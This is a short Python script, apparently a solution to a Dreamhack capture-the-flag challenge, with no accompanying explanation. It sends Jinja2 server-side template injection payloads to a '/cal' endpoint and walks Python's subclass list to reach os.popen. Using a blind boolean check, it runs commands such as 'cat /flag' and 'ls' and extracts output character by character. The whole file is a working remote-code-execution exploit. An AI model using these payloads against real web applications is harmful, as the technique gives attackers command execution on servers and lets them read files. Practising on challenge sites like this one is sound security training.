import requests
import string

url = "http://host3.dreamhack.games:10984"

i = 0
while True:
    data = {"a":"' '}}{% if ''.__class__.__base__.__subclasses__()["+str(i)+"]|string == \"<class 'codecs.IncrementalDecoder'>\" %}{{4*4}}{% endif %}{{'","b":"'|int"}
    print(data)
    res=requests.post(url+"/cal", data=data)

    if "Only 0, 1" in res.text:
        print(i)
        break

    i+=1

# {{"".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys'].modules['os'].popen('ls').read()}}

ss = string.digits + string.ascii_letters + "!#$%&()*+,-./:;<=>?@[]^_`{|}~"
index = 0
loop = True
flag = ""

while loop:
    for s in ss:
        data = {"a":"' ' }}{% if ''.__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['sys'].modules['os'].popen('cat /flag').read()["+str(index)+"] == '"+s+"' %}{{4*4}}{% endif %}{{'","b":"'|int"}
        print(data)
        res=requests.post(url+"/cal", data=data)

        if "Only 0, 1" in res.text:
            flag += s
            print(flag)
            break
    
    if flag[-1] == '}':
        loop = False

    index+=1